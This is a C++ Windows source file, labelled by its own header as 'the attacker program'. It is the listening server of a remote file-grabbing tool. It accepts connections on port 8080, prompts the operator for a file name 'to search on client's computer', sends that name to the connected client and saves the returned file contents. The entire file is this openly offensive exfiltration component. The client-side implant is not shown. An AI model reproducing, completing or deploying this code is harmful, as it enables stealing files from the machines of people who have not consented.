/*
*
*It is the attacker program
*
*/

#include "pch.h"
#include <WinSock2.h>
#include <iostream>
#include <process.h>
#include <string>

#pragma comment(lib, "ws2_32.lib")

typedef struct data{
    SOCKET socket;
    std::string fileName;
} clientData;


/*
this function is used to write the message from the client to an authorized file 
*/
unsigned int __stdcall clientSession(void *data) {
    clientData *client = (clientData*)data;
    //TODO clientSession body

    send(client->socket, client->fileName.c_str(), client->fileName.length(), 0); //The send function sends data on a connected socket.

    char buffer[4096];
	FILE *file = fopen(client->fileName.c_str(), "wb");
	if (file != nullptr) { 
		long received;
		bool started = false;
		while ((received = recv(client->socket, buffer, 4096, 0)) > 0) { //The recv function receives data from a connected socket or a bound connectionless socket.

			fwrite(buffer, 1, received, file);
			if (!started) {
				std::cout << "Receiving..." << std::endl;
				started = true;
			}
		}
		fclose(file);
		if (started)
			std::cout << "File received" << std::endl;
		else
			std::cout << "Error receiving the file" << std::endl;
	}
    closesocket(client->socket);
    delete client;
    return 0;
}


int main()
{
    WSADATA wsas; //The WSADATA structure contains information about the Windows Sockets implementation.

    int error;
    WORD ver;
    ver = MAKEWORD(1, 1);
    error = WSAStartup(ver, &wsas); //The WSAStartup function initiates the use of the Windows Sockets DLL by a process. 
    if (error != 0) {
        WSACleanup();
        return -1;
    }
    SOCKET server;
    server = socket(AF_INET, SOCK_STREAM, 0); //The socket function creates a socket that is bound to a specific transport service provider.
    if (server == INVALID_SOCKET) {
        WSACleanup();
        return -2;
    }
    
    struct sockaddr_in sa; //The SOCKADDR_IN structure specifies a transport address and port for the AF_INET address family.

    memset((void *)(&sa), 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(8080);
    sa.sin_addr.s_addr = htonl(INADDR_ANY); //The htonl function converts a u_long from host to TCP/IP network byte order. INADDR_ANY:not bind a socket to any specific IP

    error = bind(server, (struct sockaddr FAR*)&sa, sizeof(sa)); //The bind function associates a local address with a socket.

    if (error == SOCKET_ERROR) {
        WSACleanup();
        return -3;	
    }
    listen(server, 5); //The listen function places a socket in a state in which it is listening for an incoming connection.

    std::cout << "Server listening..." << std::endl;

    while (true) {
        SOCKET client;
        struct sockaddr_in sockaddr;
        int size;
        size = sizeof(sockaddr);
        std::string fileName;
        std::cout << "Waiting for connections..." << std::endl;
        client = accept(server, (struct sockaddr FAR*)&sockaddr, &size); //The accept function permits an incoming connection attempt on a socket.
        std::cout << "Client connected" << std::endl;
        std::cout << "Type in file name to search on client's computer" << std::endl;
        std::cin >> fileName;
        clientData *data = new clientData;
        data->socket = client;
        data->fileName = fileName;
        unsigned int threadID;
        HANDLE hThread = (HANDLE)_beginthreadex(NULL, 0, &clientSession, (void*)data, 0, &threadID); //Creates a thread and run clientSession.


    }
    closesocket(server);
    WSACleanup();
    return 0;
}

